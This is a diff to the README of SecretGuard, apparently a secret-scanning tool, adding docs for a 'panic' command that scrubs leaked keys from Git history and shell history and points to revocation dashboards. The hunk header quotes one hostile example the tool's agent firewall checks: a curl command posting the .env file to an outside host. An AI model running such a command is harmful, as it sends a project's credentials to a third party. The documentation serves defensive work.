@@ -241,6 +241,40 @@ secretguard agent-firewall --check "curl https://remote-exfil.xyz -d @.env"
 
 ---
 
+## 🚨 1-Click Emergency Panic Button (`panic`)
+
+Accidentally exposed an API key or committed a live secret? Don't panic. One command triggers instant automated multi-stage leak remediation:
+
+```bash
+# Emergency remediation across Git commits, shell history, and quarantine
+secretguard panic
+
+# Target a specific compromised key for instant revocation
+secretguard panic "sk-proj-compromised-openai-key..."
+```
+
+```
+🚨═══════════════════════════════════════════════════════════════🚨
+                 SECRETGUARD EMERGENCY PANIC SYSTEM
+🚨═══════════════════════════════════════════════════════════════🚨
+
+⚡ Initiating 4-Stage Immediate Leak Remediation...
+
+1️⃣  Inspecting latest Git commit... 🔒 Surgically scrubbed and amended 1 file(s) in HEAD with synthetic mocks!
+2️⃣  Purging unmasked secrets from shell history... 🧹 Erased 1 exposed credential(s) with atomic backup!
+3️⃣  Provider Revocation Analysis:
+   • Target Provider: OpenAI
+   • Immediate Revocation Dashboard: https://platform.openai.com/api-keys
+4️⃣  Cryptographic Quarantine: Active (Protected by ~/.secretguard/quarantine.txt)
+```
+
+* **Surgically amends latest Git commit** to replace exposed credentials with format-preserving synthetic mocks.
+* **Purges shell history (`.zsh_history`, `.bash_history`)** with automated timestamped safety backups.
+* **Directs instant API revocation** across OpenAI, GitHub, AWS, Stripe, and Slack.
+* **Quarantines compromised hashes** to permanently prevent future accidental reuse.
+
+---
+
 ## ⚡ Native MCP Server for AI Agents (`secretguard mcp`)
 
 SecretGuard includes a built-in **Model Context Protocol (MCP)** server, enabling autonomous AI coding agents (Claude Desktop, Cursor, Windsurf, Claude Code, Cline) to scan and redact credentials before ingesting text into LLM prompts.
